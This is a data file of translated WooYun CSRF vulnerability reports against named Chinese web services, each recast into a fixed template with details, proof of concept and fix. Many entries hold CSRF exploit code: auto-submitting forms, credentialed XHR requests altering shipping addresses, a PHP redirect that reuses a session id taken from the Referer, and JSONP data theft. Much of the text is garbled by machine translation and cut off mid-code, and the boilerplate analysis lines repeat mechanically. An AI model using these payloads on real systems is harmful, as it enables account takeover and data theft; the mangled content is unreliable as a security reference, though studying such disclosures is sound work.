**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 0x01 senda certain social platformina certain social platformtranslated textpageinhas peopletextquestionfunctionality,text"thisissuewillsametexttotexta certain social platforma certain social platform".https://example.com/[redacted] followhassometextpagewilltextonesometextlinetexta certain social platform,hosthasfollowfunctionality,for example:https://example.com/[redacted]

**POC**: log ina certain social platform,pointIlink:https://example.com/[redacted] type="text/javascript" src="https://example.com/[redacted]"></script><script>$(function() {var sendweibo = 'https://example.com/[redacted]'var content = "herehasgoodtext,textlook at,translated text!https://example.com/[redacted]

**Bypass**: filterBypass

**Fix**: FixJSONPhijacktextfollowIa certain social platform!!https://example.com/[redacted]
---

---
### [wooyun-2015-0125194] Jiapin.com csrfone issue shipping addresstextmodify
**Vendor**: Jiapin.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifyshipping address,checklook atpacketmodifysuccess,look ataddressinformationconstructcsrflink,main code:xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("id1=315062&contact=woogggg&province=110000&city=110100&area=110101&address=fegt&address_code=000000&address_tel=13111111111&address_phone_one=111&address_phone_two=2

**POC**: textprove

**Bypass**: Direct exploitation

**Fix**: addtokenvalidationreferer
---

---
### [wooyun-2015-0122755] Vipshopone locationJSONP+CSRFleakagetextinformation
**Vendor**: Vipshop | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: nottextreview,translated textonetext~~~hasvulnerabilityaddress:https://example.com/[redacted]

**POC**: testcode:<meta charset="utf-8">textinrequest,textheartetc.text... ...</table><script type="text/javascript">window.callback=function(e){if(e['result'] == -1){alert("textfollowers,translated textlog inVipshop");return 0}if(e['cartInfo']['has_goods_left']){alert("translated textinhas " + e['cartList']['count'] + " textproduct~");}var str = '<table border=1>'for(i=0;i<e['cartList

**Bypass**: Direct exploitation

**Fix**: addtokenortextreferorothertextcsrftranslated textyoutranslated textVSRC,text!requesting a reward!
---

---
### [wooyun-2014-086306] text#CSRF(textemailisI)
**Vendor**: text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: log instatustextquestionurl:https://example.com/[redacted]

**POC**: thentext1asallcanbindtext,directlyBypassupdate1 update2

**Bypass**: Direct exploitation

**Fix**: translated text.
---

---
### [wooyun-2014-059541] translated textunderxtextone locationcsrf(canarbitrarymodifyaccountpassword)
**Vendor**: VeryCD | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: ifIdirectlysendoneurlgetcsrf,translated textlargetext...wetextlook atundercsrfcancannotresetpasswordwelook atundertranslated textuserAinputoneemailIontwo peoplea certain Internet companywelook attoAuserandBusertextasAIEasBthenemailbindthatinsidehasonebindcsrfweuseIElook atlook atmodifytranslated textthenisuserB :2042478584 password..https://example.com/[redacted] Btextquestionlinkgood,weresetunderuserweusetextAusermodifyuserIEbpassword..https://example.com/[redacted]

**POC**: ifIdirectlysendoneurlgetcsrf,translated textlargetext...wetextlook atundercsrfcancannotresetpasswordwelook atundertranslated textuserAinputoneemailIontwo peoplea certain Internet companywelook attoAuserandBusertextasAIEasBthenemailbindthatinsidehasonebindcsrfweuseIElook atlook atmodifytranslated textthenisuserB :2042478584 password..https://example.com/[redacted] Btextquestionlinkgood,weresetunderuserweusetextAusermodifyuserIEbpassword..https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: text,translated text
---

---
### [wooyun-2015-094946] a certain search enginetextCSRFtextandsensitiveoperation
**Vendor**: a certain search engine | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain search enginetextCSRFtextandsensitiveoperation,canbenottranslated textexploittext

**POC**: 1,astexttest,Iselftextvalue1text  ~~~~(>_<)~~~~  translated text2,wetranslated textonetext VIPsection,foundneedtext,thenwetextwhentruncationwefoundnotokenoftextvalidation,thattextwecometextcannotcantextCSRFattack,wetextoneform<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form id="post123" name="post123" action="https://example.com/[redacted]" method="POST"><input type="

**Bypass**: Direct exploitation

**Fix**: youtranslated text
---

---
### [wooyun-2011-02089] a certain emailserviceCSRF vulnerability
**Vendor**: a certain Internet company | **Year**: 2011 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain emailservicesetforwardHTTPpacket:POST /cgi-bin/setting1?sid=eP6_czyZRqFmXFwR HTTP/1.1Host: m84.mail.some-domain.comReferer: https://example.com/[redacted] 1022Cache-Control: max-age=0Origin: https://example.com/[redacted] Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/[IP redacted] Safari/534.24Content-Type: application/x-ww

**POC**: attackmethod:1. inNo.threetextsitecreateonepage,constructpostform.translated textsidinformationcantexthttp refererintext.2. textsendemail,insidetextthismaliciousurl. Titletranslated textthattext.3. etc.textemail.

**Bypass**: Direct exploitation

**Fix**: everyonetextallthistranslated text,oneanti-csrf tokenitstextnottext.translated textuseinsidetextcannotusestick sessionbuttextcanusedistributed cache.
---

---
### [wooyun-2013-027106] a certain social platformmultiple locationsGETtypetextcsrfsenda certain social platformworm
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thisissueina certain social platformtextintranslated textlocation.textisPOST,butGETtextcansuccess.POC:https://example.com/[redacted]

**POC**: thisvulnerabilitysametextcanthrougha certain social platformimagetext,exploitmethodnottextagaintext,on peopletextinsidetext.------------------------------------thistextcanthrougha certain social platformimagetext,textcanlook atIsubmitNo.twovulnerability.

**Bypass**: Direct exploitation

**Fix**: nottextGET POSTtextusetexttokentextreferertext20ranktextreward
---

---
### [wooyun-2012-08606] Aipaione locationCSRF vulnerability
**Vendor**: Aipai | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptGETinformationwhen,notforGETsource(Referer)verify,also does notinGETinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.textusetext,ina certain sometext,textYY,forum,comment,sendtextthisaddress,oruseIMGtranslated textusethisaddress,thentextfollowersthentext~~

**POC**: https://example.com/[redacted]]&callback%09=scribeSuccess_new&action=addSubscribe

**Bypass**: Direct exploitation

**Fix**: checkGETsourceRefererinGETinformation add to token
---

---
### [wooyun-2015-0126096] Zhongwumultiple locationsCSRFall bundled
**Vendor**: Zhongwu | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: <html><head><title>poc2.html</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="startdate" value="2015-06-06"><input type="hidden" name="enddate" value="2015-07-07"><input type="hidden" name="companyname" value="%E5%B9%BF%E4%B8%9C%E5%86%B

**Bypass**: Direct exploitation

**Fix**: addtokenoftextvalidation
---

---
### [wooyun-2015-093605] a certain game companypassportCSRF vulnerabilityendangers account security
**Vendor**: Shanda Network | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: first register peopleuserlog insuccess,textaccountprofile data incomplete,clickfill in profile datacanlook attoneedtextitemsfill in profile datasubmitas followsdataname=textandtextidCard=340304197908257431Birthday=1990-01-01mobile=phone=question1=c_question1=answer1=question2=c_question2=answer2=1203121582Fsubmit=novalidationdatasubmission sourcethistextenterlineexploit,csrfcode is as followstriggercode,then cansuccess..

**POC**: csrfcodetriggersuccessaftertextagaintextlook atpassport,thistranslated text.iftextaccountnamed,throughthesetextinformationcandirectlyputpasswordsuccessrecover.

**Bypass**: Direct exploitation

**Fix**: 1,validationinformationsubmission source,whethercomes fromlegitimate webpage;2,indatafieldtexthiddenaddhashvalue,validationdatawhethertext
---

---
### [wooyun-2013-019574] a certain social platforma certain social platformcanaddfollowersandtextwormtext
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: textFix.translated text~~
---

---
### [wooyun-2015-0138067] textquestiontextadmin backendtextnotwhencausingarbitrarytextfollow
**Vendor**: textquestiontext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textquestiontextsysteminfollowa certain textlinkas follows:https://example.com/[redacted]

**POC**: translated text

**Bypass**: Direct exploitation

**Fix**: text
---

---
### [wooyun-2011-02215] textexploitflashcross-domain0daytextgmailsuccesstext
**Vendor**: google | **Year**: 2011 | **Type**: successintrusion incident

**Meta-thinking**: Trigger signal: functional testing

**Insight**: successintrusion incident lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify successintrusion incident-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: everyonecanlook attoalltextallisFLASHsendtogetherrequest,butnorequestcrossdomain.xml,andtexttotextATetc.valuesendtogetherCSRF.thisistranslated textoneFLASHcross-domain0DAY.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2012-08608] a certain portal siteone locationCSRF vulnerability
**Vendor**: a certain portal site | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

**POC**: vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="msg" value="XX" /><input type="text" name="act" value="insertTwitter" /><input type="text" name="groupid" value="0" /><input type="s

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2013-021135] DoubanAPI 2.0interfaceCSRF
**Vendor**: Douban | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: DoubanAPI V2 textdevelopertextoperationDoubanaccountinterface,translated textenterlineoauth2.0authentication.buta certain someinterface,onlytextislog instatus,notneedauthenticationtextcanuse.itsintextinterfacetextforservicetextrestrictionnottextissue,causinghascsrfvulnerability,cancontrolDoubanlog inaccountsendtextarbitrarytext.

**POC**: textsendtextinsidedescriptionisonlytextPOST,buttexttesting foundGETmethodcandirectlysendtranslated text,textforforalreadylog inDoubanuser,textnotneedoauthauthentication.textsendtextcopytext textcantranslated text,textetc.etc..translated textcode - - thisnotwilltextnotthrough,translated textCSRF.

**Bypass**: Direct exploitation

**Fix**: thisnotusetext.(iftextcloudvulnerabilitysubmittextoperationfailed,text,No.two times.)
---

---
### [wooyun-2014-056991] a certain Internet companytextnottextauthenticationcausingCSRFcanworm
**Vendor**: a certain Internet company | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: <form id="Test" name="Test" action="https://example.com/[redacted]" method="POST"><input type="text" name="content" value="test" /><input type="text" name="title" value="Test" /><input type="submit" value="submit" /></form><script>document.Test.submit();</script>testhastext

**Bypass**: Direct exploitation

**Fix**: 1, validationHTTP Refererfield2,inrequestaddressinaddtokenandvalidation3,inHTTPtextintranslated textpropertyandvalidation
---

---
### [wooyun-2012-06746] a certain Internet companya subsitecsrfvulnerability
**Vendor**: a certain Internet company | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain Internet companya subsitenottextcsrftext,causingvulnerabilityoccur!

**POC**: 1,textsenda certain social platform2,onlytextuserclicklinkthentriggercsrfattack

**Bypass**: Direct exploitation

**Fix**: addtexttokenortextreferer
---

---
### [wooyun-2015-0156392] a certain textcompanytranslated textunderonetextonetranslated textone locationhasCSRFcanadd/modifytextaddress
**Vendor**: a certain textcompany | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] notaddtokenPOC<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="receiverAdd&#46;receiverName" value="wooyun" /><input type="hidden" name="receiverAdd&#46;mobile" value="13838383838" /><input type="hidden" name="receiverAdd&#46;detailAddress" value="wooyunwooyun" /><input type="hidden"

**POC**: https://example.com/[redacted] notaddtokenPOC<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="receiverAdd&#46;receiverName" value="wooyun" /><input type="hidden" name="receiverAdd&#46;mobile" value="13838383838" /><

**Bypass**: Direct exploitation

**Fix**: addtoken  addreferer check
---

---
### [wooyun-2015-0129208] translated textone locationvulnerabilitycanusecomeresetuserpassword
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: https://example.com/[redacted] action="https://example.com/[redacted]" method="POST"><input type="hidden" name="question" value="1" /><input type="hidden" name="answer" value="hackimg" /><input type="

**Bypass**: Direct exploitation

**Fix**: addonesomevalidation.
---

---
### [wooyun-2012-05815] TOMemailCSRF vulnerability
**Vendor**: TOMintext | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: forforpackettextimagewithtext,requestwithtextRefererinwillexposewhentextsid,text:GET /mblogpic/be654a34c8f4aad1ec6a/2000 HTTP/1.1Host: t100.qpic.cnConnection: keep-aliveCache-Control: max-age=0If-Modified-Since: Fri, 06 Apr 2012 14:00:09 GMTUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19Accept: */*Referer: https://example.com/[redacted]

**POC**: testcode:<?php$url = parse_url($_SERVER['HTTP_REFERER']);$host = $url['host'];parse_str($url['query']);$loc = "http://$host/cgi/ldapapp?sid=$sid&tempname=options%2Frefuselist.htm&funcid=opuserattr&optype=set&refuselist=test%40test.com&update.x=1";header("Location: $loc");?>

**Bypass**: Direct exploitation

**Fix**: inURLintextsidproperty,restrictionGEToperation
---

---
### [wooyun-2014-076803] a certain textplatformCSRFone issue
**Vendor**: onalsotranslated textinformationservicehastextcompany | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: CSRFFORM,log inafterdirectlytextquestion:<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="QuestionId1" value="1" /><input type="hidden" name="Answer1" value="a1" /><input type="hidden" name="QuestionId2" value="2" /><input type="hidden" name="Answer2" value="a2" /><input type="hidden" name="QuestionId3" value="3" /><input type="hidden" name="Answer3" value=

**POC**: usetextlog insecurityissue,throughvalidation.provehaslog insuccess.POST /userbind/answersafequestion HTTP/1.1Host: ac.ppdai.comProxy-Connection: keep-aliveContent-Length: 74Accept: */*Origin: https://example.com/[redacted] XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.

**Bypass**: Direct exploitation

**Fix**: DBlog intextaddtoken
---

---
### [wooyun-2015-0163667] translated textCSRF vulnerability
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: log intranslated text,canchecklook attextsendtranslated textandcomment,as shown below:textonehtmlfileas shown:thisfileusedone<img>text,itsinaddresstextdeletetranslated textarticlelink.attackeriftextusertextquestionthispage,imagewilltextloadfailed,as shown below:usernotwilltexttotext,butchecklook attranslated textpersonalinhearttext,foundtextsendtranslated textbedelete,as shown below:

**POC**: see detailed description.

**Bypass**: Direct exploitation

**Fix**: insensitiveoperationtranslated textinputvalidationcode,orenterlineReferer Check,oruseAnti SCRF Token.
---

---
### [wooyun-2015-0144015] PPTV(PPlive)one locationfunctional design flaw causescross-siterequest forgery(CSRF)
**Vendor**: PPTV(PPlive) | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: 1.CAPTCHA is considered a defense againstCSRFattacks and the simplest effective defensive method.2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2014-057977] Zhihuone locationcsrfcandeletehasuseinformation
**Vendor**: Zhihu | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: has peopletranslated textlook attotext,notokenhttps://example.com/[redacted]

**POC**: Itranslated text

**Bypass**: Direct exploitation

**Fix**: othertextcsrftranslated textgood
---

---
### [wooyun-2014-085749] look atItextuseCRSFasselftextpointtext
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: texton timesvulnerabilitytextcrsf,wecantexttotranslated texthereusepointtextas an examplepointtextaddressas:https://example.com/[redacted]

**POC**: a certain onetranslated textpointtranslated textontextthencanprovecanlargetranslated textwepointtextintextgoodhas peopletext,asselftext100text,cantranslated text2one,do not knowcantranslated textone,translated text!

**Bypass**: Direct exploitation

**Fix**: FixCRSF textvalidation
---

---
### [wooyun-2014-054785] Renren-a certain search engineOAuth 2.0 redirect_uir CSRF vulnerability
**Vendor**: Renren | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text-a certain search engine OAuth 2.0 during the authentication flowhttps://example.com/[redacted] Parameters comeresisttextforredirect_uir CSRF attack.ifattackerrestartonepersonaltext-a certain search engineOAuth 2.0 authenticationrequest,andinterceptOAuth 2.0 authenticationrequestreturn.https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-036152] translated textcsrf
**Vendor**: sanwen8.cn | **Year**: 2013 | **Type**: network design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: network design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify network design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: sitetextlog inaftercanclickoneunder:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: Fix! astextbemaliciousexploit.putthisurltranslated text,nottextany usertext
---

---
### [wooyun-2014-054894] translated text-a certain Internet company OAuth 2.0 redirect_uir CSRF vulnerability
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text-a certain Internet company OAuth 2.0 during the authentication flowhttps://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: recommendVendortexthastextmethodcomeresisttextfor OAuth 2.0 redirect_uir CSRF attack.for example:1. inputuseraccountbindtextNo.threetextaccountbefore,force the user to re-enteraccountpassword.textpoint: willsacrifice user experience. becauselargetextnumberuserinlog inuseafter,isnottextagaininputpassword.2. throughvalidation referervaluecomeresistCSRF attack,
---

---
### [wooyun-2013-025888] a certain textwebsiteCSRF,cansenda certain social platform,a certain Internet company,a certain portal site,a certain social platform
**Vendor**: a certain textwebsite | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: commentlocationnottexttokenvalidationorreferervalidation,candirectlyCSRF,textcantextusertranslated textsametexttoa certain social platform.

**POC**: function publish(){url='https://example.com/[redacted]';data='sync=true';post(url,data,true);url = 'https://example.com/[redacted]';data = 'id=MAC5TbSP&c=1234555';post(url,data,true);}itsinNo.onerequestistextusertext"sametexttoa certain social platform",No.tworequestinidParametersistranslated textonetextarticle,No.twoParametersiscommentcontent,notextvalidation

**Bypass**: Direct exploitation

**Fix**: validationToken,validationsource
---

---
### [wooyun-2015-0164890] textlinetextcsrfdeleteshipping address
**Vendor**: textlinetext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: intestwebsitetextfounddeletetextaddresstext,onlyadoptIDenterlineauthentication,textthenistextonlytranslated textfortextaddressID,textcanconstructpocenterlineCSRF,foristexttwo peoplenumbercometest:account1:account2:constructurl:https://example.com/[redacted] src="https://example.com/[redacted]"></html>

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: tokenauthentication
---

---
### [wooyun-2015-0128626] p2ptextsecuritybeforealsohandletranslated textmultiple locationsCSRF vulnerability
**Vendor**: id68.cn | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] action="https://example.com/[redacted]" method="POST"><input type="hidden" name="cell&#95;phone" value="13333333331" /><input type="hidden" name="info" value="222" /><input type="hidden" name="age" value="0" /><input type="hidden" name="province" value="0" /><input type="hidden" name="area" value="decode error#175;&#183;decode error#128;&#137;decode error#1

**POC**: singletranslated text<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="department&#95;name" value="1111111111111111111" /><input type="hidden" name="department&#95;address" value="1111111111111111111" /><input type="hidden" name="&#95;tps" value=

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2014-075461] a certain social platforma certain social platforma subsitecsrfsendtextandcanunlimitedsendtranslated text
**Vendor**: a certain social platform | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] a certain social platformtextlocationcapture packets texthastoken

**POC**: texttesting found validationReferertextReferer as*.weibo.comtranslated textcanget  sendtext  forisconstructurlhttps://example.com/[redacted] ...cansendtextarbitrarya certain social platformuser2:translated textpartsendtextcapture packets directlytointruder  1000translated text!!1000text..

**Bypass**: Direct exploitation

**Fix**: text timestextsendtext timesnumber validationReferertext  notisfriendcannotsendtext
---

---
### [wooyun-2015-0106224] translated textCSRF vulnerabilityone issue
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textaccountafter needvalidationtranslated textandtextnamednotokenvalidation canCSRFmodifyusernamedtranslated textnotaddtoken

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: addtokenvalidation
---

---
### [wooyun-2015-0127229] namedtranslated textcsrfvulnerability
**Vendor**: namedtranslated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: namedtranslated textmultiple locationshascsrfvulnerability,thistextusemodifyshipping addressas an example.modifyshipping address,capture packets:modifysuccess:nonotcantextParameters,constructlinkxmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("__VIEWSTATE=&ctl00%24ctl00%24ContentBody%24ContentRight%24hcity=110000&ctl00%24ctl00%24ContentBody%24ContentRight%24harea=110101&ctl00%24ctl0

**POC**: multiple locationshastextvulnerability,textVendortextonemodifyrequesting a reward..

**Bypass**: Direct exploitation

**Fix**: validationrefereraddtoken
---

---
### [wooyun-2014-060609] Easytalk latest versiontwolocationCSRF
**Vendor**: nextsns.com | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: localtextthreenumbertest1,test2,test3test3asbeattackeraccount0x1 addtextlocationhasCSRF,canboost followers,look atprovelog intest2,texttest1,foundlinkisthis wayhttp://localhost/easytalk/?m=friends&a=addfollow&user_id=11&rand=2105translated textuser_idistest1id,aftertexthastextnumberrand,nottextaftertextproveisnouseusetest2publishonetextinformation,packettexthostlinklog intextfollowersaccounttest3,intextlook attothisetc.contenttextpointoneunderresultisthis wayagainthenthenfounddirectlytext

**POC**: 0x2 canceltextlocationhasCSRF,look attext peoplenumbernottextthen...look atprovelog intest2,foundcanceltexttest2linkisthis wayhttp://localhost/easytalk/?m=friends&a=delfollow&user_id=11&rand=192192samehandle,randistextuseusethislinkcomepublishinformationlog intest3,canlook atto,click

**Bypass**: Direct exploitation

**Fix**: checksourcePS:textoneunder,astextlocaltest,becausetranslated textistextfailed,textwhentranslated textnamednottext,notext
---

---
### [wooyun-2013-041011] textpackettextlinetextlocationCSRF
**Vendor**: textpackettextline | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1. deletetextlocationcancsrf,GETmethodpoc:<img src=https://example.com/[redacted] favoritefunctionalityhasCSRF.poc:https://example.com/[redacted] textfunctionalityhasCSRFpoc:https://example.com/[redacted]

**POC**: selfpublishonetexttest:textquestionpocpage:texthomepage,textbedelete.

**Bypass**: Direct exploitation

**Fix**: referencewooyuntextdatabase:https://example.com/[redacted]
---

---
### [wooyun-2012-09949] a certain social platforma certain social platformfollow/add followCSRF vulnerability(alreadytext)
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

